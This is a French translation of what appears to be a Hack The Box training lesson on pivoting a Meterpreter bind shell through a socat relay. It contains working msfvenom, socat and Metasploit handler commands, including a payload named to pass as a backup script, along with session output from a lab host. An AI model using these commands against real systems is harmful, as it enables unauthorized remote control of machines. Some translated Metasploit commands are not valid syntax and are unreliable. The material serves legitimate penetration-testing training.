Redirection Socat avec un shell direct
===================================

Semblable au redirecteur de shell inversé de notre socat, nous pouvons également créer un redirecteur de shell de liaison socat. Ceci est différent des shells inversés qui se connectent du serveur Windows au serveur Ubuntu et sont redirigés vers notre hôte d'attaque. Dans le cas des shells de liaison, le serveur Windows démarre un écouteur et se lie à un port particulier. Nous pouvons créer une charge utile de shell de liaison pour Windows et l'exécuter sur l'hôte Windows. En même temps, nous pouvons créer un redirecteur socat sur le serveur Ubuntu, qui écoutera les connexions entrantes d'un gestionnaire de liaison Metasploit et les transmettra à une charge utile de shell de liaison sur une cible Windows. La figure ci-dessous devrait mieux expliquer le pivot.

![](https://academy.hackthebox.com/storage/modules/158/55.png)

Nous pouvons créer un shell de liaison en utilisant msfvenom avec la commande ci-dessous.

#### Création de la charge utile Windows

Création de la charge utile Windows

```
dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 499 octets
Taille finale du fichier exe : 7168 octets
Enregistré sous : backupjob.exe

```

Nous pouvons démarrer un écouteur `socat bind shell`, qui écoute sur le port `8080` et transmet les paquets au serveur Windows `8443`.

#### Démarrage de Socat Bind Shell Listener

Démarrage de Socat Bind Shell Listener

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080, fork TCP4:172.16.5.19:8443

```

Enfin, nous pouvons démarrer un gestionnaire de liens Metasploit. Ce gestionnaire de liaison peut être configuré pour se connecter à l'écouteur de notre socat sur le port 8080 (serveur Ubuntu)

#### Configuration et démarrage du multi/gestionnaire Bind

Configuration et démarrage du multi/gestionnaire Bind

```
msf6 > use exploit/multi/handler

[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
msf6 exploit(multi/handler) > définir la charge utile windows/x64/meterpreter/bind_tcp
charge utile => windows/x64/meterpreter/bind_tcp
exploit msf6 (multi/gestionnaire)> définir RHOST 10.129.202.64
RHOST => 10.129.202.64
exploit msf6 (multi/gestionnaire)> définir LPORT 8080
LPORT => 8080
exploit msf6 (multi/gestionnaire)> exécuter

[*] Démarrage du gestionnaire TCP de liaison contre 10.129.202.64:8080

```

Nous pouvons voir un gestionnaire de liaison connecté à une demande d'étape pivotée via un écouteur socat lors de l'exécution de la charge utile sur une cible Windows.

#### Établir une session Meterpreter

Établir une session Meterpreter

```
[*] Étape d'envoi (200262 octets) à 10.129.202.64
[*] Meterpreter session 1 ouverte (10.10.14.18:46253 -> 10.129.202.64:8080 ) au 2022-03-07 12:44:44 -0500

meterpreter > getuid
Nom d'utilisateur du serveur : INLANEFREIGHT\victor

```